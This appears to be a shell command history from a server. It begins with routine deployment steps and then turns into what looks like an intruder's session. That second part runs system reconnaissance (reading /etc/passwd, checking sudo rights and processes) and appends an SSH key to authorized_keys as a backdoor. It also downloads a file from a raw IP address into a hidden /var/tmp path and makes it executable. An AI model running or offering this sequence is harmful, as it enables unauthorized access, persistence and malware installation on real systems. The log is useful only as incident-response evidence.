systemctl status app
cd app
git pull
make deploy
tail -f /var/log/app/app.log
ls
sudo systemctl restart app
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDWyvCK6CEhWUae4KR1XacNJFjKGlkDzYZc+uwHLWTPw ops@build' >> ~/.ssh/authorized_keys
wget -q http://103.43.92.252/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
